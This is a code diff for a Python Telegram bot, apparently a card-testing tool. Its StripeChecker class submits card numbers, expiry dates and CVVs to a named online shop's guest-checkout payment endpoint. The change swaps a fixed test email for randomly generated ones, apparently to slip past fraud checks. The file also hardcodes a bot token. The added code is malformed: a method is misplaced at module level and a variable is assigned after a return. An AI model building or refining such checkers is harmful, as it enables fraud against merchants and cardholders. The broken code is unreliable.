@@ -6,6 +6,8 @@ from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQu
 import requests
 import json
 import base64
+import random
+import string
 
 # ========== الإعدادات ==========
 BOT_TOKEN = "8166484030:AAHwrm95j131yJxvtlNTAe6S57f5kcfU1ow"
@@ -44,7 +46,14 @@ class StripeChecker:
             'accept': 'application/json',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         }
-        
+def generate_random_email(self):
+    """توليد بريد إلكتروني عشوائي"""
+    username_length = random.randint(8, 12)
+    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=username_length))
+    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'test.com']
+    domain = random.choice(domains)
+    return f"{username}@{domain}"
+    random_email = self.generate_random_email()
     def check(self, card_number, exp_month, exp_year, cvv):
         try:
             headers = self.headers.copy()
@@ -85,7 +94,7 @@ class StripeChecker:
                     'method': 'stripe_payments',
                     'additional_data': {'payment_method': pm_id},
                 },
-                'email': 'test@test.com',
+                'email': random_email,
             }
             
             url = f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information'
